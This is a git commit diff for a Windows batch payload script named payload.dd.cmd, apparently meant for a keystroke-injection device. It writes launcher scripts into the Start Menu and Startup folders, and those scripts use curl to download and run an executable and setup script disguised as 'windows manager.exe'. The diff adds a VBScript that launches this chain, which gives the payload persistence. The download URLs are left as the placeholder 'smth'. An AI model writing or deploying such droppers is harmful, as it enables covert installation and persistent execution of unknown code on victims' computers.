641b9e7bdae373a03d8eed95b220d5efceadc5fd
chamaedoreapruductions <96385448+chamaedoreapruductions@users.noreply.github.com>
2022-03-20 22:28:43 +0100

    Update payload.dd.cmd

--- payload.dd.cmd
+++ payload.dd.cmd
@@ -2,7 +2,7 @@ cd C:
 cd %APPDATA%
 cd Microsoft\Windows\Start Menu\Programs
 echo ^curl smth ^> "windows manager.exe" ^&^& ^curl smth ^> "img.png" ^&^& ^curl smth ^> "setup.cmd" ^&^& setup.cmd ^&^& ^cd Startup ^&^& windows manager.cmd > "windows manager.cmd"
-echo ... > "windows manager.vbs"
+echo WScript.Sleep 100; Dim x; ^Set x = Wscript.CreateObject("WScript.Shell"); x.run("Startup/windows manager.cmd") > "windows manager.vbs"
 cd Startup
 echo ^cd .. windows manager.cmd > "windows manager.cmd"
 windows manager.cmd
